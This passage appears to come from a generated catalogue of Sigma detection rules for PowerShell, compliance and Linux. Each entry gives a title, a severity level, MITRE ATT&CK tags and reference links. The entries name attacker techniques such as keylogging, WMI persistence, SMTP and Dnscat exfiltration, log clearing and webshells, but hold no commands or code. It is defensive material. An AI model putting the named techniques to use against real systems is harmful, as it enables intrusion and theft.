
    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_winlogon_helper_dll.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.md

    
### Suspicious Hyper-V Cmdlets
    
    Adversaries may carry out malicious operations using a virtual instance to avoid detection

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_hyper_v_condlet.yml
* https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.006/T1564.006.md#atomic-test-3---create-and-start-hyper-v-virtual-machine

    
### Invoke-Obfuscation RUNDLL LAUNCHER
    
    Detects Obfuscated Powershell via RUNDLL LAUNCHER

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_rundll.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious Invoke-Item From Mount-DiskImage
    
    Adversaries may abuse container files such as disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1553.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_run_from_mount_diskimage.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-2---mount-an-iso-image-and-run-executable-from-the-iso

* https://docs.microsoft.com/en-us/powershell/module/storage/mount-diskimage?view=windowsserver2022-ps

    
### Execution via CL_Mutexverifiers.ps1 (2 Lines)
    
    Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_cl_mutexverifiers_lolscript_count.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml

* https://twitter.com/pabraeken/status/995111125447577600

    
### Extracting Information with PowerShell
    
    Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials.
These can be files created by users to store their own credentials, shared credential stores for a group of individuals,
configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.


    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_extracting.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.md

    
### Powershell WMI Persistence
    
    Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription.

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_wmi_persistence.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.003/T1546.003.md

* https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545

    
### Detected Windows Software Discovery
    
    Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1518
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_software_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.md

* https://github.com/harleyQu1nn/AggressorScripts

    
### PowerShell WMI Win32_Product Install MSI
    
    Detects the execution of an MSI file using PowerShell and the WMI Win32_Product class

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_win32_product_install_msi.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md

    
### SyncAppvPublishingServer Execution to Bypass Powershell Restriction
    
    Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
* https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/

    
### Enable Windows Remote Management
    
    Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_enable_psremoting.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md#atomic-test-1---enable-windows-remote-management

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.2

    
### Suspicious PowerShell Download
    
    Detects suspicious PowerShell download command

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_download.yml
    
### Powershell Install a DLL in System32
    
    Uses PowerShell to install a DLL in System32

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1556.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_copy_item_system32.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.002/T1556.002.md#atomic-test-1---install-and-register-password-filter-dll

    
### Suspicious PowerShell WindowStyle Option
    
    Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_windowstyle.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.003/T1564.003.md

    
### Powershell Keylogging
    
    Adversaries may log user keystrokes to intercept credentials as the user types them.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1056.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_keylogging.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1

    
### Live Memory Dump Using Powershell
    
    Detects usage of a PowerShell command to dump the live memory of a Windows machine

    * Level: high
    * MITRE: attack.t1003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_memorydump_getstoragediagnosticinfo.yml
* https://docs.microsoft.com/en-us/powershell/module/storage/get-storagediagnosticinfo

    
### Suspicious Export-PfxCertificate
    
    Detects Commandlet that is used to export certificates from the local certificate store and sometimes used by threat actors to steal private keys from compromised machines

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_export_pfxcertificate.yml
* https://us-cert.cisa.gov/ncas/analysis-reports/ar21-112a

* https://docs.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate

    
### Registry-Free Process Scope COR_PROFILER
    
    Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR.
The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR).
These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.
(Citation: Microsoft Profiling Mar 2017)
(Citation: Microsoft COR_PROFILER Feb 2013) 


    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1574.012
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_cor_profiler.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.012/T1574.012.md#atomic-test-3---registry-free-process-scope-cor_profiler

    
### Suspicious PowerShell Invocations - Generic
    
    Detects suspicious PowerShell invocation command parameters

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_invocation_generic.yml
    
### NTFS Alternate Data Stream
    
    Detects writing data into NTFS alternate data streams from powershell. Needs Script Block Logging.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.004
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_ntfs_ads_access.yml
* http://www.powertheshell.com/ntfsstreams/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md

    
### Suspicious SSL Connection
    
    Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.

    * Level: low
    * MITRE: attack.command_and_control
    * MITRE: attack.t1573
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_ssl_keyword.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md#atomic-test-1---openssl-c2

* https://medium.com/walmartglobaltech/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926

    
### PowerShell ADRecon Execution
    
    Detects execution of ADRecon.ps1 for AD reconnaissance which has been reported to be actively used by FIN7

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_adrecon_execution.yml
* https://github.com/sense-of-security/ADRecon

* https://bi-zone.medium.com/from-pentest-to-apt-attack-cybercriminal-group-fin7-disguises-its-malware-as-an-ethical-hackers-c23c9a75e319

    
### PowerShell Create Local User
    
    Detects creation of a local user via PowerShell

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.persistence
    * MITRE: attack.t1136.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_create_local_user.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136/T1136.md

    
### Powershell Exfiltration Over SMTP
    
    Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.
The data may also be sent to an alternate network location from the main command and control server. 


    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_send_mailmessage.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.2

* https://www.ietf.org/rfc/rfc2821.txt

    
### Suspicious Unblock-File
    
    Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1553.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_unblock_file.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-3---remove-the-zoneidentifier-alternate-data-stream

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/unblock-file?view=powershell-7.2

    
### Dnscat Execution
    
    Dnscat exfiltration tool execution

    * Level: critical
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_dnscat_execution.yml
    
### PowerShell PSAttack
    
    Detects the use of PSAttack PowerShell hack tool

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_psattack.yml
* https://adsecurity.org/?p=2921

    
### Host Without Firewall
    
    Host Without Firewall. Alert means not complied. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management.

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/compliance/host_without_firewall.yml
* https://www.cisecurity.org/controls/cis-controls-list/

* https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf

* https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf

    
### Cleartext Protocol Usage
    
    Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels. Ensure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used  for all administrative account access.

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/compliance/netflow_cleartext_protocols.yml
* https://www.cisecurity.org/controls/cis-controls-list/

* https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf

* https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf

    
### Cleartext Protocol Usage
    
    Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels. Ensure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used  for all administrative account access.

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/compliance/firewall_cleartext_protocols.yml
* https://www.cisecurity.org/controls/cis-controls-list/

* https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf

* https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf

    
### Default Credentials Usage
    
    Before deploying any new asset, change all default passwords to have values consistent with administrative level accounts. Sigma detects default credentials usage. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management.

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/compliance/default_credentials_usage.yml
* https://www.cisecurity.org/controls/cis-controls-list/

* https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf

* https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf

* https://community.qualys.com/docs/DOC-6406-reporting-toolbox-focused-search-lists

    
### Locked Workstation
    
    Automatically lock workstation sessions after a standard period of inactivity. The case is not applicable for Unix OS. Supported OS - Windows 2008 R2 and 7, Windows 2012 R2 and 8.1, Windows 2016 and 10 Windows Server 2019.

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/compliance/workstation_was_locked.yml
* https://www.cisecurity.org/controls/cis-controls-list/

* https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf

* https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf

* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4800

    
### Group Modification Logging
    
    Configure systems to issue a log entry and alert when an account is added to or removed from any group assigned administrative privileges. Sigma detects\ \ Event ID 4728 indicates a \u2018Member is added to a Security Group\u2019. Event ID 4729 indicates a \u2018Member is removed from a Security enabled-group\u2019\ . Event ID 4730 indicates a\u2018Security Group is deleted\u2019. The case is not applicable for Unix OS. Supported OS - Windows 2008 R2 and 7, Windows 2012 R2\ \ and 8.1, Windows 2016 and 10 Windows Server 2019, Windows Server 2000, Windows 2003 and XP.

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/compliance/group_modification_logging.yml
* https://www.cisecurity.org/controls/cis-controls-list/

* https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf

* https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf

* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728

* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4729

* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4730

* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=633

* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=632

* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=634

    
### Cron Files
    
    Detects creation of cron files or files in Cron directories. Potential persistence.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1053.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/file_create/cron_files.yml
* https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/attack-based/persistence/T1053.003_Cron_Activity.xml

    
### Linux Doas Conf File Creation
    
    Detects the creation of doas.conf file in linux host platform.

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/file_create/lnx_doas_conf_creation.yml
* https://research.splunk.com/endpoint/linux_doas_conf_file_creation/

* https://www.makeuseof.com/how-to-install-and-use-doas/

    
### OMIGOD SCX RunAsProvider ExecuteShellCommand
    
    Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.initial_access
    * MITRE: attack.execution
    * MITRE: attack.t1068
    * MITRE: attack.t1190
    * MITRE: attack.t1203
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_omigod_scx_runasprovider_executeshellcommand.yml
* https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure

* https://github.com/Azure/Azure-Sentinel/pull/3059

* https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_omigod_scx_runasprovider_executeshellcommand.yml

    
### Commands to Clear or Remove the Syslog
    
    Detects specific commands commonly used to remove or empty the syslog.

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1565.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_clear_syslog.yml
* https://github.com/SigmaHQ/sigma/blob/master/rules/linux/lnx_clear_syslog.yml

    
### OMIGOD SCX RunAsProvider ExecuteScript
    
    Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell. Script being executed gets created as a temp file in /tmp folder with a scx* prefix. Then it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/. The file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.initial_access
    * MITRE: attack.execution
    * MITRE: attack.t1068
    * MITRE: attack.t1190
    * MITRE: attack.t1203
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_omigod_scx_runasprovider_executescript.yml
* https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure

* https://github.com/Azure/Azure-Sentinel/pull/3059

* https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_omigod_scx_runasprovider_executescript.yml

    
### DD File Overwrite
    
    Detects potential overwriting and deletion of a file using DD.

    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.t1485
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_dd_file_overwrite.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md#atomic-test-2---macoslinux---overwrite-file-with-dd

    
### Interactive Bash Suspicious Children
    
    Detects suspicious interactive bash as a parent to rather uncommon child processes

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_susp_interactive_bash.yml
* Internal Research

    
### Local System Accounts Discovery
    
    Detects enumeration of local systeam accounts

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1087.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_local_account.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md

    
### BPFtrace Unsafe Option Usage
    
    Detects the usage of the unsafe bpftrace option

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_bpftrace_unsafe_option_usage.yml
* https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/

* https://bpftrace.org/

    
### System Network Connections Discovery
    
    Detects usage of system utilities to discover system network connections

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1049
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_system_network_connections_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md

    
### System Network Discovery - Linux
    
    Detects enumeration of local network configuration

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1016
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_system_network_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md

    
### Linux Network Service Scanning
    
    Detects enumeration of local or remote network services.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_network_service_scanning.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md

    
### Install Root Certificate
    
    Detects installed new certificate

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1553.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_install_root_certificate.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md

    
### Local Groups Discovery
    
    Detects enumeration of local system groups

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_local_groups.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md

    
### Linux Shell Pipe to Shell
    
    Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1140
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml
* Internal Research

    
### System Information Discovery
    
    Detects system information discovery commands

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1082
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_system_info_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md

    
### Disabling Security Tools
    
    Detects disabling security tools

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_security_tools_disabling.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md

    
### Clear Linux Logs
    
    Detects clear logs

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_clear_logs.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.002/T1070.002.md

    
### Scheduled Cron Task/Job
    
    Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1053.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_schedule_task_job_cron.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.003/T1053.003.md

    
### Linux Doas Tool Execution
    
    Detects the doas tool execution in linux host platform.

    * Level: low
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_doas_execution.yml
* https://research.splunk.com/endpoint/linux_doas_tool_execution/

* https://www.makeuseof.com/how-to-install-and-use-doas/

    
### File Deletion
    
    Detects file deletion commands

    * Level: informational
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_file_deletion.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md

    
### Linux Webshell Indicators
    
    Detects suspicious sub processes of web server processes

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml
* https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/

    
### File and Directory Discovery
    
    Detects usage of system utilities to discover files and directories

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1083
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_file_and_directory_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md

    
### Scheduled Task/Job At
    
    Detects the use of at/atd

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.t1053.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_at_command.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.001/T1053.001.md

    
### Linux Crypto Mining Indicators
    
    Detects command line parameters or strings often used by crypto miners

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_crypto_mining.yml
* https://www.poolwatch.io/coin/monero

    
### Decode Base64 Encoded Text
    
    Detects usage of base64 utility to decode arbitrary base64-encoded text

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_base64_decode.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027/T1027.md

    
### Clipboard Collection with Xclip Tool
    
    Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.

    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.t1485
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_clipboard_collection.yml
* https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_clipboard_collection.yml

    
### Security Software Discovery
    
    Detects usage of system utilities (only grep for now) to discover security software discovery

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1518.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_security_software_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md

    
### Process Discovery
    
    Detects process discovery commands

    * Level: informational
    * MITRE: attack.discovery
    * MITRE: attack.t1057
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_process_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1057/T1057.md

    
### Linux Remote System Discovery
    
    Detects the enumeration of other remote systems.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1018
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/process_creation/proc_creation_lnx_remote_system_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md

    
### Multiple Modsecurity Blocks
    
    Detects multiple blocks by the mod_security module (Web Application Firewall)

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1499
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/modsecurity/modsec_mulitple_blocks.yml
    
### Logging Configuration Changes on Linux Host
    
    Detect changes of syslog daemons configuration files

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_logging_config_change.yml
* self experience

    
### Masquerading as Linux Crond Process
    
    Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/linux/auditd/lnx_auditd_masquerading_crond.yml
